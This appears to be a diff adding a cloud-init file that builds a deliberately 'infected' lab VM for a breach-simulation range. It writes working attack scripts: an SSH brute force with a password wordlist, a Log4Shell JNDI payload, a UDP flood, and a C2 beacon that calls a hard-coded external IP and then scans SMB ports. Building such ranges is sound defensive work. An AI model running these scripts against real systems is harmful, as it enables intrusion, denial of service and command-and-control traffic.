@@ -1,0 +1,101 @@
+#cloud-config
+# VM "poste infecté" — scripts d'attaque installés mais NON démarrés automatiquement.
+# breach-sim déclenche les attaques via SSH (commandes ciblées par scénario).
+hostname: ${hostname}
+fqdn: ${hostname}.breach.local
+
+users:
+  - name: breach
+    groups: [sudo]
+    shell: /bin/bash
+    sudo: ALL=(ALL) NOPASSWD:ALL
+    ssh_authorized_keys:
+      - ${ssh_public_key}
+
+package_update: true
+package_upgrade: false
+packages:
+  - curl
+  - wget
+  - nmap
+  - netcat-openbsd
+  - python3
+  - python3-pip
+  - hydra           # brute force SSH
+  - hping3          # flood UDP/ICMP pour DDoS
+  - qemu-guest-agent
+
+write_files:
+  # ── Scénario 1 : SSH brute force ──────────────────────────────────────────
+  - path: /opt/breach/ssh-brute.sh
+    permissions: '0700'
+    content: |
+      #!/bin/bash
+      # Usage: ./ssh-brute.sh <target_ip>
+      # Tente une liste de mots de passe courants sur SSH.
+      TARGET="${1:-192.168.${instance_id + 10}.10}"
+      hydra -l root -P /opt/breach/wordlist.txt -t 4 -f ssh://"$TARGET" 2>&1 | tee /tmp/brute.log
+      echo "EXIT:$?"
+
+  # ── Scénario 2 : Log4Shell simulation ────────────────────────────────────
+  - path: /opt/breach/log4shell.sh
+    permissions: '0700'
+    content: |
+      #!/bin/bash
+      # Envoie un payload JNDI dans le header User-Agent vers srv-web.
+      TARGET="${1:-192.168.${instance_id + 10}.10}"
+      PAYLOAD='$${jndi:ldap://infected.breach.local:1389/exploit}'
+      for i in $(seq 1 20); do
+        curl -s -H "User-Agent: $PAYLOAD" "http://$TARGET/" -o /dev/null
+        sleep 0.2
+      done
+      echo "Log4Shell payloads envoyés vers $TARGET"
+
+  # ── Scénario 3 : DDoS UDP flood ───────────────────────────────────────────
+  - path: /opt/breach/ddos-udp.sh
+    permissions: '0700'
+    content: |
+      #!/bin/bash
+      # Usage: ./ddos-udp.sh <target_ip> [duration_s]
+      TARGET="${1:-192.168.${instance_id + 10}.10}"
+      DURATION="${2:-10}"
+      timeout "$DURATION" hping3 --udp -p 80 --flood "$TARGET" 2>&1 || true
+      echo "DDoS terminé"
+
+  # ── Scénario 4 : Ransomware C2 beacon ─────────────────────────────────────
+  - path: /opt/breach/c2-beacon.sh
+    permissions: '0700'
+    content: |
+      #!/bin/bash
+      # Simule un beacon Cobalt Strike vers une IP C2 externe.
+      C2="${1:-194.165.16.72}"
+      echo "[*] Beacon C2 vers $C2:443..."
+      for i in $(seq 1 5); do
+        curl -sk --max-time 2 "https://$C2/beacon" -d '{"id":"infected-${instance_id}","action":"checkin"}' || true
+        sleep 3
+      done
+      echo "[*] Tentative mouvement latéral..."
+      for ip in 10 11 12 13 14 16 17 18 19 20; do
+        nc -z -w1 192.168.${instance_id + 10}.$ip 445 2>/dev/null && \
+          echo "[+] Port 445 ouvert sur 192.168.${instance_id + 10}.$ip" || true
+      done
+
+  # ── Wordlist minimale pour brute force ────────────────────────────────────
+  - path: /opt/breach/wordlist.txt
+    permissions: '0644'
+    content: |
+      password
+      123456
+      admin
+      root
+      letmein
+      qwerty
+      breach2024
+      Password1
+      changeme
+      toor
+
+runcmd:
+  - systemctl enable qemu-guest-agent && systemctl start qemu-guest-agent
+  - chmod +x /opt/breach/*.sh
+  - echo "Poste infecté breach-${instance_id} prêt — attaques dans /opt/breach/"
